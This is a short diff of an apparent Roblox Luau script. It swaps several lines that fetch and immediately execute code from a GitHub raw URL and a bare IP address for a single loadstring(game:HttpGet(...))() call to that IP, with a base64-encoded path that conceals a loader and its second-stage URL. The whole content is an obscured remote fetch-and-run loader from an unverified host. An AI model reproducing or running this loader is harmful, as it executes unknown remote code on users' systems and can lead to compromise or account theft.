@@ -1,3 +1,1 @@
-ID="d2a95d1e-4a7f-4104-80de-147d5081e1f7";
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/dad"));
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImNjZWIyMDRmLTRmOWUtNGQ4Mi04YTAyLWEwNmZhMTA0NmZkNyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vamF6emVkZC9TY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9kYWQifX0"))()
